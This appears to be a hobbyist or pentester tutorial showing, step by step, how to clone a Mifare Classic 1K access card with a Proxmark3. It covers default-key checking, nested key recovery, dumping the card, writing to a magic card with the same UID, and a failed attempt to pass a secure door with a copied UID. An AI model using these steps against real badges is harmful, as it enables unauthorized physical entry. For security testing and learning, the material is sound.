
# Mifare Classic 1K ISO14443A

```bash
proxmark3> hf search
```

Which results in a response along the lines of:

```bash hl_lines="5 9"
 #db# DownloadFPGA(len: 42096)
 UID : de 0f 3d cd
ATQA : 00 04  
 SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: HARDENED (hardnested)
Valid ISO14443A Tag Found - Quiting Search
```

In this case it’s a Mifare 1k card. This also shows us the UID (de0f3dcd) of the card, which we’ll need later. From there we can find keys in use by checking against a list of default keys (hopefully one of these has been used):

proxmark3> hf mf chk * ?
This should show us the key we require looking something like:

No key specified, trying default keys  
chk default key[ 0] ffffffffffff  
chk default key[ 1] 000000000000  
chk default key[ 2] a0a1a2a3a4a5  
chk default key[ 3] b0b1b2b3b4b5  
chk default key[ 4] aabbccddeeff  
chk default key[ 5] 4d3a99c351dd  
chk default key[ 6] 1a982c7e459a  
chk default key[ 7] d3f7d3f7d3f7  
chk default key[ 8] 714c5c886e97  
chk default key[ 9] 587ee5f9350f  
chk default key[10] a0478cc39091  
chk default key[11] 533cb6c723f6  
chk default key[12] 8fd0a4f256e9  
--sector: 0, block:  3, key type:A, key count:13
Found valid key:[ffffffffffff]  
...omitted for brevity...
--sector:15, block: 63, key type:B, key count:13
Found valid key:[ffffffffffff]  
This shows a key of ffffffffffff, which we can plug into the next command, which dumps keys to file:

proxmark3> hf mf nested 1 0 A ffffffffffff d
This dumps keys from the card into the file dumpkeys.bin.

Now to dump the contents of the card:

proxmark3> hf mf dump
This dumps data from the card into dumpdata.bin

At this point we’ve got everything we need from the card, we can take it off the reader.

To copy that data onto a new card, place the (Chinese backdoor) card on the proxmark:

proxmark3> hf mf restore 1
This restores the dumped data onto the new card. Now we just need to give the card the UID we got from the original hf search command:

proxmark3> hf mf csetuid ba2ea6ab
We’re done, the new card should work.

This whole process can be completed in a minute or two, so it’s not a quick read of the card by any means.

Why do we need keys
When most modern cards are placed next to a card reader there’s a handshake to ensure the card has the expected keys. This handshake moves the card through a number of states and only when the handshake successfully completes will the card allow access to all data stored on it. This is the reason that you can’t simply clone most cards, you need the correct key to complete the handshake and allow access to the contents of the card.

A defensive lesson
Some cards use default keys, while this makes it easy to clone a card, it also makes it pretty poor from a defensive point of view. It’s like using default admin credentials for a database, it makes an attackers life easy.

The lights on the Proxmark
I have to admit pretty much ignoring them. When I use it, it’s always connected to the laptop, so I’ve got the console output to see what it’s doing. There was a point where I tried to understand them, I found a guide, they were starting to make sense. Then I updated the device and that changed what the lights did completely. I’ve ignored them ever since.

Fix a broken card
We had a situation where we wanted to clone a Mifare Desfire card but didn’t have an identical card to copy it to – we only had a Mifare Classic 1K. We also couldn’t read the complete card as we didn’t have the key to authenticate, so all we could usefully get was the UID. Some research suggested a small chance that just using the UID might be enough to get past a secure door if there was a (very) sloppy implementation. We copied that UID (10 bytes) to a Mifare Classic 1K card (which uses a 7 byte UID). The difference in UID size was another indication that this was very unlikely to work. it didn’t work. Doing this left our Mifare Classic card in a state where the Proxmark wouldn’t even read it, so to fix that we did:

proxmark3> hf mf cwipe 1 w f